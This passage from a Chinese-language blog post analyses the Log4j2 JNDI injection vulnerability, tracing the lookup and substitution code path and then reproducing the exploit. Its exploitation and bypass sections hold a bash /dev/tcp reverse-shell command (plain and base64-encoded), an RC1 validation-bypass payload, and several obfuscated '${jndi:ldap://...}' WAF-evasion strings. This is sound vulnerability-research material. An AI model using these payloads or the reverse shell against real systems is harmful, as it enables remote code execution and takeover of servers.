<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919170045148.png" alt="image-20220919170045148"  />
</p>
<h3 id="字符串替换">字符串替换<a hidden class="anchor" aria-hidden="true" href="#字符串替换">#</a></h3>
<p>Log4j2 提供 Lookup 功能的字符替换的关键处理类，位于<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>，首先来看一下这个类。</p>
<p>类中提供了关键的 <code>DEFAULT_ESCAPE</code> 是 <code>$</code>，<code>DEFAULT_PREFIX</code> 前缀是 <code>${</code>，<code>DEFAULT_SUFFIX</code> 后缀是 <code>}</code>，<code>DEFAULT_VALUE_DELIMITER_STRING</code> 赋值分隔符是 <code>:-</code>，<code>ESCAPE_DELIMITER_STRING</code> 是 <code>:\-</code>。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919170236685.png" alt="image-20220919170236685"  />
</p>
<p>然后通过<code>StrSubstitutor</code>初始化的构造器，将<code>prefixMather</code>、<code>suffixMatcher</code>、<code>escapeChar</code>进行赋值</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919180312435.png" alt="image-20220919180312435"  />
</p>
<p>这个类提供了<code>substitute</code>方法，是整个<code>Lookup</code>功能的核心，用来递归替换相应的字符，这里看一下逻辑。</p>
<p>通过<code>while</code>循环逐个字符寻找<code>${</code>前缀。</p>
<p>pos为当前字符串头指针，prefixMatcher.isMatch只负责匹配 <strong>${</strong> 两个字符。如果匹配到就进入第二层循环匹配，原理和代码相似。如果没有匹配到**}**字符，pos指针就正常+1。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919180746020.png" alt="image-20220919180746020"  />
</p>
<p>找到前缀后开始寻找后缀，但是在找后缀的<code>while</code>循环里面，又判断了是否替换变量中的值，如果替换，再匹配一次前缀，如果又找到了前缀，则<code>continue</code>跳出循环，再走一次找后缀的逻辑，用来满足变量中嵌套的过程。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182217609.png" alt="image-20220919182217609"  />
</p>
<p>找后缀<code>}</code>的代码</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182334040.png" alt="image-20220919182334040"  />
</p>
<p>后续的处理中，通过多个 if/else 用来匹配 <code>:-</code> 和 <code>:\-</code>。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182621510.png" alt="image-20220919182621510"  />
</p>
<ul>
<li><code>:-</code> 是一个赋值关键字，如果程序处理到 <code>${aaaa:-bbbb}</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>${aaa:\\-bbb:-ccc}</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
</ul>
<p>在没有匹配到变量赋值或处理结束后，将会调用 <code>resolveVariable</code> 方法解析满足 Lookup 功能的语法，并执行相应的 lookup ，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析。</p>
<ul>
<li>继续截取<code>${}</code>中的内容，主要是为了判断是否还有<code>${}</code></li>
</ul>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182812878.png" alt="image-20220919182812878"  />
</p>
<p>因此在字符串替换的过程中可以看到，方法提供了一些特殊的写法，并支持递归解析。而这些特性，将会可以用来进行绕过 WAF。</p>
<p><code>resolveVariable</code> 则调用 <code>this.variableResolver#lookup</code> 方法进行处理，而这实际上是一个代理类 <code>Interpolator</code>，这个类在接下来的内容进行说明</p>
<h3 id="lookup处理"><code>Lookup</code>处理<a hidden class="anchor" aria-hidden="true" href="#lookup处理">#</a></h3>
<p>由上面的函数栈调用，我们知道log4j2使用<code>org.apache.logging.log4j.core.lookup.Interpolator</code> 类来代理所有的 <code>StrLookup</code> 实现类。也就是说在实际使用 Lookup 功能时，由 Interpolator 这个类来处理和分发。</p>
<p>这个类在初始化时创建了一个 <code>strLookupMap</code> ，将一些 lookup 功能关键字和处理类进行了映射，存放在这个 Map 中。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183113435.png" alt="image-20220919183113435"  />
</p>
<p>默认是加入 log4j、sys、env、main、marker、java、lower、upper、jndi、jvmrunargs、spring、kubernetes、docker、web、date、ctx，由于部分功能的支持并不在 core 包中，所以如果加载不到对应的处理类，则会添加警告信息并跳过。而这些不同 Lookup 功能的支持，是随着版本更新的。</p>
<p>处理和分发的关键逻辑在于其 <code>lookup</code> 方法，通过 <code>:</code> 作为分隔符来分隔 Lookup 关键字及参数，从<code>strLookupMap</code> 中根据关键字作为 key 匹配到对应的处理解析类，并调用其 lookup 方法。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183253221.png" alt="image-20220919183253221"  />
</p>
<p>本次漏洞的触发方式是使用 <code>jndi:</code> 关键字来触发 JNDI 注入漏洞，对于 <code>jndi:</code> 关键字的处理类为 <code>org.apache.logging.log4j.core.lookup.JndiLookup</code> 。看一下最关键的 <code>lookup</code> 方法，可以看到是使用了 JndiManager 来支持 JNDI 的查询功能。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183505950.png" alt="image-20220919183505950"  />
</p>
<h3 id="jdni查询"><code>JDNI</code>查询<a hidden class="anchor" aria-hidden="true" href="#jdni查询">#</a></h3>
<p>Log4j2 使用 <code>org.apache.logging.log4j.core.net.JndiManager</code> 来支持 JDNI 相关操作。</p>
<p>JndiManager 使用私有内部类 JndiManagerFactory 来创建 JndiManager 实例，如下图：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183709932.png" alt="image-20220919183709932"  />
</p>
<p>可以看到是创建了一个新的 InitialContext 实例，并作为参数传递用来创建 JndiManager，这个 Context 被保存在成员变量 context 中：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183741801.png" alt="image-20220919183741801"  />
</p>
<p><code>JndiManager#lookup</code> 方法则调用 <code>this.context.lookup()</code> 实现 JNDI 查询操作。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183823453.png" alt="image-20220919183823453"  />
</p>
<p>最终造成<code>JNDI</code>注入</p>
<h2 id="0x05-漏洞利用">0x05 漏洞利用<a hidden class="anchor" aria-hidden="true" href="#0x05-漏洞利用">#</a></h2>
<p>我们这里就采用简单的反弹<code>shell</code>拿到权限即可。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>反弹shell命令：
</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8899 0&gt;&amp;<span style="color:#ff0;font-weight:bold">1</span>
</span></span><span style="display:flex;"><span>base64加密：
</span></span><span style="display:flex;"><span>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919184922436.png" alt="image-20220919184922436"  />
</p>
<h2 id="0x06-绕过姿势">0x06 绕过姿势<a hidden class="anchor" aria-hidden="true" href="#0x06-绕过姿势">#</a></h2>
<h3 id="rc1-绕过">Rc1 绕过<a hidden class="anchor" aria-hidden="true" href="#rc1-绕过">#</a></h3>
<p>rc1更新</p>
<ul>
<li>移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1639332152586.png" alt="img"  />
</li>
</ul>
</li>
<li><code>JndiManager#lookup</code> 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1639332549257.png" alt="img"  />
</li>
</ul>
</li>
</ul>
<p>漏洞点</p>
<ul>
<li>在关键的 lookup 函数中加入了校验判断，但是由于校验逻辑有误，程序在 catch 住异常后没有 return，导致可以利用 <code>URISyntaxException</code> 异常来绕过校验，直接走到后面的 lookup。</li>
</ul>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1639332979607.png" alt="img"  />
</p>
<ul>
<li>因此，只要在判断时触发 <code>URISyntaxException</code> 异常，例如在 URI 中插入空格，即可触发漏洞,payload如下:<code>${jndi:ldap://127.0å.0.1:1389/ badClassName}</code>不对空格做编码导致异常，但是<code>lookup</code>时候会去掉这个空格）</li>
</ul>
<h3 id="rc2修复">RC2修复<a hidden class="anchor" aria-hidden="true" href="#rc2修复">#</a></h3>
<p>RC2的修复方案是直接return，有效解决了上文的绕过</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>try{
</span></span><span style="display:flex;"><span>} catch (URISyntaxException ex) {
</span></span><span style="display:flex;"><span>    LOGGER.warn(&#34;Invalid JNDI URI - {}&#34;, name);
</span></span><span style="display:flex;"><span>    return null;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>return (T) this.context.lookup(name);
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="多个执行流程">多个${}执行流程<a hidden class="anchor" aria-hidden="true" href="#多个执行流程">#</a></h3>
<p>先来分析一下多个${}的执行流程，Payload举例如下：</p>
<p><code>${aaa:${bbb:ccc}dd}${ee:ff}</code></p>
<p>当识别到多个${}时，准备来说是识别到多个${时，主要分为两种情况：</p>
<ul>
<li>
<p>当属于嵌套类型时，比如<code>${${}}</code>，参数<code>nestedVarCount</code>会执行+1操作，表示存在嵌套，防止找错闭合时用的}，会先处理内部的<code>${}</code>，再将处理结果返回后继续处理<code>${}</code> <code>；具体的原因，就是因为会递归调用</code>substitute()`，所以会先把内部的处理完。</p>
</li>
<li>
<p>当属于并列类型时，比如${}${}，会依次处理${}；因为他一次只会提取一整个<code>${}</code>。</p>
</li>
</ul>
<h3 id="分隔符">分隔符<a hidden class="anchor" aria-hidden="true" href="#分隔符">#</a></h3>
<p><code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()</code>里处理完<code>${}</code>后，就会有一部分的分隔符处理，一个是<code>valueEscapeDelimiterMatcher [:\-]</code>，另一个是<code>valueDelimiterMatcher [:-]</code></p>
<p>先来看第一个<code>valueEscapeDelimiterMatcher</code>，payload:<code> ${aa:\\-bb}</code></p>
<p>从下图可以看出来，就是给 :- 中的 \ 去掉了变成了:-，</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919233852327.png" alt="image-20220919233852327"  />
</p>
<p>再来看看valueDelimiterMatcher，payload <code>${aa:-bb}</code></p>
<p>从下面可以看出来，被:-分割成了前后两部分，前面的部分赋值给varName，后面部分赋值给varDefaultValue；</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919234014159.png" alt="image-20220919234014159"  />
</p>
<ul>
<li>varName会被传入到resolveVariable()进行解析，如果没有协议什么的，就会返回null</li>
<li>如果resolveVariable()返回值为null，varDefaultValue在后续的过程中也会递归调用substitute</li>
</ul>
<p>最后会返回varDefaultValue的值</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919234541090.png" alt="image-20220919234541090"  />
</p>
<ul>
<li>
<p>一些绕过<code>payload</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>一些绕过paylioad
</span></span><span style="display:flex;"><span>${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>感觉主要是对<code>jdni</code>字段进行处理的绕过。</li>
</ul>
</li>
</ul>
<h2 id="0x07-错误解决">0x07 错误解决<a hidden class="anchor" aria-hidden="true" href="#0x07-错误解决">#</a></h2>
<h3 id="reference-class-name-foo">Reference Class Name: foo<a hidden class="anchor" aria-hidden="true" href="#reference-class-name-foo">#</a></h3>
<h4 id="方法一">方法一<a hidden class="anchor" aria-hidden="true" href="#方法一">#</a></h4>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918170850226.png" alt="image-20220918170850226"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> 因为在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为false
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们这里java版本为:<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918171016840.png" alt="image-20220918171016840"  />
</p>
<p>版本比较高，所以导致报错。</p>
<p>所以这里需要加上一下代码：<code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>即可复现成功</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918171148116.png" alt="image-20220918171148116"  />
</p>
<h4 id="方法二">方法二：<a hidden class="anchor" aria-hidden="true" href="#方法二">#</a></h4>
<p>实际上限制了<code>trustURLCodebase</code>为<code>Flase</code>并不影响其执行系统命令，我们可以通过反弹<code>shell</code>拿到开启log4j2服务主机的权限。只需要指定命令:<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>即可。</p>
<h2 id="0x08-参考资料">0x08 参考资料<a hidden class="anchor" aria-hidden="true" href="#0x08-参考资料">#</a></h2>
<p><a href="https://cloud.tencent.com/developer/article/1987389">https://cloud.tencent.com/developer/article/1987389</a></p>
<p><a href="https://www.cnblogs.com/hhhhhxian/p/16214263.html">https://www.cnblogs.com/hhhhhxian/p/16214263.html</a></p>
<p><a href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a></p>
<p><a href="https://www.websecuritys.cn/index.php/archives/576/">https://www.websecuritys.cn/index.php/archives/576/</a></p>
<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
<p><a href="https://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q">https://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/en/tags/log4j2/">log4j2</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="/en/posts/tech/dockerfile%E7%BC%96%E5%86%99/">
    <span class="title">« Prev</span>
    <br>
    <span>Dockerfile编写</span>
  </a>
  <a class="next" href="/en/posts/tech/xss/">
    <span class="title">Next »</span>
    <br>
    <span>Xss</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="en/">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
